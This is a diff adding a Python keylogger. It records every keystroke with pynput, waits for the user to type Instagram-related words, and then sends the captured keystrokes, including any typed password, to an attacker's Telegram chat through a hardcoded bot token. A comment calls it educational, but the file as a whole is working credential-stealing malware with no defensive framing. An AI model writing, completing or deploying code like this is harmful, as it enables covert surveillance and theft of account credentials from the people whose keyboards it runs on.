@@ -1,0 +1,67 @@
+from pynput import keyboard
+import telebot
+import threading
+import time
+
+# "github" this code is for educational purposes and not for ethical purposes
+
+# === CONFIG ===
+TELEGRAM_BOT_TOKEN = '3218028640900:AAG6ILGeNt7WWanpyFnJGEmVG0CzzHUtrY0321'  # Replace with your bot token
+CHAT_ID = 7762094542321  # Make sure it's an integer, not a string
+
+bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
+
+logged_keys = []
+keywords = ["insta", "instagram", "instagramm", "ig"]
+logging_active = False
+logging_start_time = 0
+
+def on_press(key):
+    global logging_active, logging_start_time
+    try:
+        if key.char is not None:
+            logged_keys.append(key.char)
+    except AttributeError:
+        # Handle special keys
+        if key == keyboard.Key.space:
+            logged_keys.append(' ')
+        elif key == keyboard.Key.enter:
+            logged_keys.append('\n')
+        else:
+            logged_keys.append(f'[{key.name}]')  # Log other keys like shift, ctrl
+
+    # Safe check for last 10 characters
+    recent_keys = [k for k in logged_keys[-10:] if isinstance(k, str)]
+    message = ''.join(recent_keys).lower()
+
+    if any(keyword in message for keyword in keywords) and not logging_active:
+        logging_active = True
+        logging_start_time = time.time()
+
+def send_to_telegram():
+    global logging_active, logging_start_time
+    while True:
+        if logging_active:
+            current_time = time.time()
+            if current_time - logging_start_time >= 200:  # 2 minutes
+                message = ''.join(logged_keys)
+                try:
+                    with open('keylog.txt', 'w', encoding='utf-8') as file:
+                        file.write(message)
+                    with open('keylog.txt', 'rb') as file:
+                        bot.send_document(CHAT_ID, file)
+                    print("✅ Sent to Telegram.")
+                except Exception as e:
+                    print(f"❌ Error sending to Telegram: {e}")
+                logged_keys.clear()
+                logging_active = False
+        time.sleep(1)
+
+# Start Telegram sending thread
+telegram_thread = threading.Thread(target=send_to_telegram)
+telegram_thread.daemon = True
+telegram_thread.start()
+
+# Start key listener
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
